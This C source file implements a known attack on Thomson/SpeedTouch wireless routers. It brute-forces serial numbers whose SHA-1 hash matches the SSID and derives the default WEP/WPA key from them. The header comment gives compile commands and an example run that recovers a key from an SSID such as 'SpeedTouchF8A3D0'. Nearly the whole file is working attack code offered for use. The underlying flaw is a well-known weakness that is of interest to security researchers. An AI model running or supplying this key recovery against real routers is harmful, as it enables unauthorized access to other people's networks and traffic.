/*
   **************************************************************************
   *                                                                        *
   * Default WEP/WPA key generation for Thomson series wireless routers     *
   *                                                                        *
   *   Date:   March 15th 2008                                                *
   *   Author: Kevin Devine <wyse101@gmail.com>                             *
   *   WWW:    http://weiss.u40.hosting.digiweb.ie/                         *
   *                                                                        *
   **************************************************************************

   AFAIK, this is a well known problem by some ISP.
   It is likely to affect any owner of a Thomson wireless router with 
   default settings installed.

   To compile using gcc:

     gcc -fomit-frame-pointer -O3 -funroll-all-loops stkeys.c sha1.c -ostkeys

   If on Linux, replace the sha1.c parameter with: -l crypto
   
   Example usage for ST585v6 router:
      
      SSID: "SpeedTouchF8A3D0":

   c:\stkeys -v -iF8A3D0

   Serial Number: CP0615**109 - potential key = 742DA831D2  <- this is the right one
   Serial Number: CP0621**AHJ - potential key = 00651124D9

   Found 2 potential keys.

*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <getopt.h>
#include <ctype.h>
#include "common.h"
#import <CommonCrypto/CommonDigest.h>

typedef unsigned char u8;
typedef unsigned int u32;

const char charTable[]="0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
const char hexTable[]="0123456789ABCDEF";
      char serial[13]={'C','P','0',0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};

#define hexmsb(x)(hexTable[((x & 0xf0) >> 4)])
#define hexlsb(x)(hexTable[ (x & 0x0f)])

/*
 * convert hexadecimal ssid string to binary
 * return 0 on error or binary length of string
 *
 */
u32 str2ssid(char ssid[],char *str) {

    char *p,*q = ssid;
    int len = strlen(str);

    if( (len % 2) || (len > MAX_SSID_OCTETS) )
      return(0);

    for(p = str;(*p = toupper(*p)) && (strchr(hexTable,*p)) != 0;) {

      if(--len % 2) {
        *q = ((char *)strchr(hexTable,*p++) - hexTable);
        *q <<= 4;
      } else {
        *q++ |= ((char *)strchr(hexTable,*p++) - hexTable);
      }
    }
    return( (len) ? 0 : (p - str) / 2);
}

/*
 * print 5 bytes to output buffer
 *
 */
int dump_key(char *out, u8 *key) {
  
    u32 i;
    u8 *p = key;

    for(i = 0;i < DEFAULT_KEY_SIZE;i++)
      sprintf(out+(i*2),"%.2X",*p++);
    return i*2;
    //fprintf(out,"\n");
}

int
compute_key(char *strId, int year, char *output, int len) {

    unsigned char sha1_digest[40]={0};
    char ssid[8]={0},buf[8]={0},week,x1,x2,x3;
    int keys = 0,ssidLen = 0;
    int offset = 0;
    if(!(ssidLen = str2ssid(ssid,strId)))
        return -99;
    
    //fprintf(stdout,"\nGenerating keys..please wait\n\n");

    serial[3] = year | '0';

    // 52 weeks of the year

    for(week = 1;week <= 52;week++) {

      serial[4] = (week / 10) + '0';
      serial[5] = (week % 10) + '0';

      for(x1 = 0;x1 < 36;x1++) {

        serial[6] = hexmsb(charTable[x1]);
        serial[7] = hexlsb(charTable[x1]);

        for(x2 = 0;x2 < 36;x2++) {

          serial[8] = hexmsb(charTable[x2]);
          serial[9] = hexlsb(charTable[x2]);

          for(x3 = 0;x3 < 36;x3++) {
            
            serial[10] = hexmsb(charTable[x3]);
            serial[11] = hexlsb(charTable[x3]);

            // hash serial number with sha-1
            CC_SHA1(serial, SERIAL_LENGTH, sha1_digest);
            // compare SSID octets with last number of bytes supplied

            if(memcmp(&sha1_digest[(20-ssidLen)],ssid,ssidLen) == 0) {
              // check if more keys will fit in the provided buffer
              if (keys >= len/(OUTPUT_KEY_SIZE))
                  goto __done;

              keys++;
              memcpy(buf,serial,6);
              sprintf(&output[offset], "[%s**%C%C%C]: ", buf, charTable[x1],charTable[x2],charTable[x3]);
              offset += OUTPUT_OVERHEAD;
              dump_key(&output[offset],sha1_digest);
              offset += DEFAULT_KEY_SIZE*2;
              strcat(&output[offset], "\n");
              output[++offset] = 0; // ensure to null-terminate the string
            }
          }
        }
      }
    }
__done:
    //fprintf(stdout,"\nFound %d potential keys.\n",keys);
    return keys;
}
